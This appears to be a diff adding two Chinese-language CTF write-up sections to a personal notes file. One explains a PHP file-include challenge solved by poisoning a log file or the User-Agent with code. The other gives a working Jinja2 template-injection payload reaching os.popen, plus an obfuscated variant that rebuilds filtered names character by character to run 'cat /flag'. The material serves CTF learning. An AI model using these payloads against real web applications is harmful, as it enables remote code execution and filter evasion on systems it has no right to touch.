@@ -10979,7 +10979,54 @@ req = requests.post(url, data=data)
 print(req.text)
 ```
 
+## [HNCTF 2022 WEEK2]easy_include
 
+这题虽然简单，但是一开始居然没有反应过来；由于过滤了大部分的伪协议，所以这里的思路是往日志文件写恶意代码，再用include函数包含日志文件；
+
+```php
+<?php
+//WEB手要懂得搜索
+
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    if(preg_match("/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=/i", $file)){
+        die("error");
+    }
+    include($file);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+![image-20240616152509566](CTF.assets/image-20240616152509566.png)
+
+**还有一种思路是UA写码**
+
+![image-20240616152629125](CTF.assets/image-20240616152629125.png)
+
+## [GDOUCTF 2023]<ez_ze>
+
+> jinjia2 模板注入
+
+过滤字符：
+
+```
+\{\{|\}\}|popen|os|subprocess|application|getitem|flag\.txt|\.|_|\[|\]|\"|class|subclasses|mro|\\
+```
+
+这里可以看到是过滤的比较死的，主要的难点在于绕过`. _`这里，在网上看了一下别人的绕过手法，配合上葵花宝典，综合起来就是用`attr`来绕过`.`，`format`绕过关键字的过滤，这里给出payload：
+
+```
+原payload：
+{% print(''|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(235)|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('whoami')|attr('read')()) %}
+
+混淆后：
+{% print(''|attr('%c%c%c%c%c%c%c%c%c'|format(95,95,99,108,97,115,115,95,95))|attr('%c%c%c%c%c%c%c%c'|format(95,95,98,97,115,101,95,95))|attr('%c%c%c%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,115,117,98,99,108,97,115,115,101,115,95,95))()|attr('%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,103,101,116,105,116,101,109,95,95))(395)|attr('%c%c%c%c%c%c%c%c'|format(95,95,105,110,105,116,95,95))|attr('%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,103,108,111,98,97,108,115,95,95))|attr('%c%c%c%c%c%c%c%c%c%c%c'|format(95,95,103,101,116,105,116,101,109,95,95))('%c%c'|format(111,115))|attr('%c%c%c%c%c'|format(112,111,112,101,110))('cat /flag')|attr('%c%c%c%c'|format(114,101,97,100))()) %}
+```
+
+看了一些别人的做法，发现了一个叫fenjing的工具可以一把梭！害，拼了那么久的payload不够人家一把梭
+
+![image-20240616211136607](CTF.assets/image-20240616211136607.png)
 
 
 
